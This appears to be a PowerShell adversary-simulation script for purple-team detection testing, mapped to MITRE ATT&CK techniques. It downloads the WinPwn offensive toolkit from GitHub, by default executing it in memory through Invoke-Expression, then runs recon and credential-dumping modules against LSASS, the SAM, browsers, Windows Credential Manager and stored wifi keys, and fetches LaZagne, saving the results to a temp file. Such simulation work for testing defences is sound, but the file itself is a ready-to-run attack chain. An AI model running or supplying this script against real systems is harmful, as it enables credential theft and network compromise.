<#

    T1002 - Data Compressed
    T1003 - Credential Dumping 
    T1003.001 - OS Credential Dumping: LSASS Memory
    T1003.002 - OS Credential Dumping: Security Account Manager
    T1003.004 - OS Credential Dumping: LSA Secrets
    T1003.005 - OS Credential Dumping: Cached Domain Credentials
    T1003.006 - OS Credential Dumping: DCSync
    T1007 - System Service Discovery
    T1016 - System Network Configuration Discovery
    T1018 - Remote System Discovery
    T1033 - System Owner/User Discovery
    T1046 - Network Service Discovery
    T1047 - Windows Management Instrumentation
    T1049 - System Network Connections Discovery
    T1056 - Input Capture
    T1057 - Process Discovery
    T1059 - Command-Line Interface 
    T1069 - Permission Groups Discovery
    T1069.002 - Permission Groups Discovery: Domain Groups
    T1081 - Credentials in Files
    T1082 - System Information Discovery
    T1086 - PowerShell
    T1087.002 - Account Discovery: Domain Account
    T1098 - Account Manipulation     
    T1117 - Regsvr32
    T1120 - Peripheral Device Discovery
    T1134 - Access Token Manipulation
    T1134.005 - Access Token Manipulation: SID-History Injection
    T1135 - Network Share Discovery
    T1136 - Create Account 
    T1145 - Network Share Connection Removal 
    T1201 - Password Policy Discovery
    T1204.002 - User Execution: Malicious File
    T1207 - Rogue Domain Controller
    T1482 - Domain Trust Discovery
    T1491.001 - Defacement: Internal Defacement
    T1518.001 - Software Discovery: Security Software Discovery
    T1547.005 - Boot or Logon Autostart Execution: Security Support Provider
    T1550.002 - Use Alternate Authentication Material: Pass the Hash
    T1550.003 - Use Alternate Authentication Material: Pass the Ticket
    T1552.001 - Unsecured Credentials: Credentials In Files
    T1552.004 - Unsecured Credentials: Private Keys
    T1555 - Credentials from Password Stores
    T1555.001 - Keychain
    T1555.003 - Credentials from Web Browsers
    T1555.004 - Windows Credential Manager
    T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket
    T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket
    T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
    T1588.001 - Obtain Capabilities: Malware
    T1588.002 - Obtain Capabilities: Tool
    T1615 - Group Policy Discovery
    T1649 -	Steal or Forge Authentication Certificates
    Executing Winpwn scripts from https://raw.githubusercontent.com//mthcht/WinPwn/master/Offline_WinPwn.ps1
#>

param(
    [Parameter(Mandatory=$false)]
    [switch]$download,
    [Parameter(Mandatory=$false)]
    [switch]$inmemory
)

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force -Verbose

function exec_commands($dumpfile){
    Write-Host -ForegroundColor Cyan "[Info] Running command 'WinPwn -noninteractive -consoleoutput -Localrecon (enumerate as much information for the local system as possible) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- WinPwn -noninteractive -consoleoutput -Localrecon ---------" -Verbose -Force
    WinPwn -noninteractive -consoleoutput -Localrecon >> $dumpfile
    
    Write-Host -ForegroundColor Cyan "[Info] Running command 'WinPwn -noninteractive -consoleoutput -DomainRecon (return every single domain recon script and function) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- WinPwn -noninteractive -consoleoutput -DomainRecon ---------" -Verbose -Force
    WinPwn -noninteractive -consoleoutput -DomainRecon >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'Generalrecon -noninteractive (Execute basic local recon functions and store the output in the corresponding folders) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- Generalrecon -noninteractive ---------" -Verbose -Force
    Generalrecon -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'WinPwn -PowerSharpPack -consoleoutput -noninteractive (Execute Seatbelt, PowerUp, Watson and more C# binaries in memory) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- WinPwn -PowerSharpPack -consoleoutput -noninteractive ---------" -Verbose -Force
    WinPwn -PowerSharpPack -consoleoutput -noninteractive >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'Kittielocal -noninteractive -consoleoutput -browsercredentials (Dump Browser-Credentials via Sharpweb returning the output to console) >> $dumpfile'..." 
    Add-Content $dumpfile "$(get-date)`n--------- Kittielocal -noninteractive -consoleoutput -browsercredentials ---------" -Verbose -Force
    Kittielocal -noninteractive -consoleoutput -browsercredentials >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'dumplsass -noninteractive -consoleoutput (Dumping LSASS) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- dumplsass -noninteractive -consoleoutput ---------" -Verbose -Forcec
    dumplsass -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'obfuskittiedump -noninteractive -consoleoutput >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- obfuskittiedump -noninteractive -consoleoutput ---------" -Verbose -Force
    obfuskittiedump -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'Invoke-WCMDump -noninteractive -consoleoutput (Dumping Windows Credential Manager) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- Invoke-WCMDump -noninteractive -consoleoutput ---------" -Verbose -Force
    Invoke-WCMDump -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'Invoke-Sharpweb -command `"all`" (Getting Browser Credentials using Sharpweb) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- Invoke-Sharpweb -command `"all`" ---------" -Verbose -Force
    Invoke-Sharpweb -command "all" >> $dumpfile
    
    Write-Host -ForegroundColor Cyan "[Info] Running command 'samfile -noninteractive -consoleoutput (Dumping SAM) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- samfile -noninteractive -consoleoutput ---------" -Verbose -Force
    samfile -noninteractive -consoleoutput >> $dumpfile
    
    Write-Host -ForegroundColor Cyan "[Info] Running command 'SharpCloud -noninteractive -consoleoutput >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- SharpCloud -noninteractive -consoleoutput ---------" -Verbose -Force
    SharpCloud -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'wificreds -noninteractive -consoleoutput >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- wificreds -noninteractive -consoleoutput (Get stored wifi credentials) ---------" -Verbose -Force
    wificreds -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'lazagnemodule -noninteractive -consoleoutput (Downloads and executes Lazagne from AlessandroZ for Credential gathering / privilege escalation) >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- lazagnemodule -noninteractive -consoleoutput ---------" -Verbose -Force
    lazagnemodule -noninteractive -consoleoutput >> $dumpfile

    Write-Host -ForegroundColor Cyan "[Info] Running command 'Dotnetsearch -consoleoutput -noninteractive >> $dumpfile'..."
    Add-Content $dumpfile "$(get-date)`n--------- Dotnetsearch -consoleoutput -noninteractive ---------" -Verbose -Force
    Dotnetsearch -consoleoutput -noninteractive >> $dumpfile
}

try{
    if (-not $inmemory -and -not $download) {
        Write-Host -ForegroundColor Yellow "[Warning] No option selected, Using default option: -inmemory"
        $inmemory = $true
    }
    if ($inmemory -and $download) {
        Write-Host -ForegroundColor Red "[Error] Both options selected, Use either -inmemory or -download"
        exit 1
    }

    $url = "https://raw.githubusercontent.com//mthcht/WinPwn/master/Offline_WinPwn.ps1"
    $outfile = "$env:tmp\Off_WnPwn.ps1"
    $dumpfile = "$env:tmp\WinPwn.txt"

    if($inmemory){
        Write-Host -ForegroundColor Cyan "[Info] Downloading $url into memory"
        $ProgressPreference = 'SilentlyContinue'
        Invoke-Expression(new-object net.webclient).downloadstring($url) -Force -Verbose
    }
    if ($download){
        Write-Host -ForegroundColor Cyan "[Info] Downloading $url to $outfile"
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $url -OutFile $outfile -UserAgent 'purpleteam' -Verbose
        if (Test-Path $outfile){
            Write-Host -ForegroundColor Green "[Success] Downloaded $url to $outfile"
            Import-module $outfile -Force -Verbose
            $module_name = $(($outfile -split '\\')[-1].Replace('.ps1',''))
            if(Get-Module -Name $module_name -Verbose){
                Write-Host -ForegroundColor Green "[Success] Loaded module $module_name"
            }
            else{
                Write-Host -ForegroundColor Red "[Error] Failed to load module $module_name"
            }           
        }
        else{
            Write-Host -ForegroundColor Red "[Error] Failed to download $url to $outfile"
        }
    }
}
catch{
    Write-Host -ForegroundColor Red "[Error] Exception - $_"
}

Write-Host -ForegroundColor Cyan "[Info] Running Winpwn commands, this can take a long time..."
exec_commands($dumpfile)
if (Test-Path $dumpfile){
    Write-Host -ForegroundColor Green "[Success] WinPwn Offline executed, output saved to $dumpfile"
}
else{
    Write-Host -ForegroundColor Red "[Error] Failed to execute WinPwn and save output to $dumpfile"
}

Stop-Transcript -Verbose 
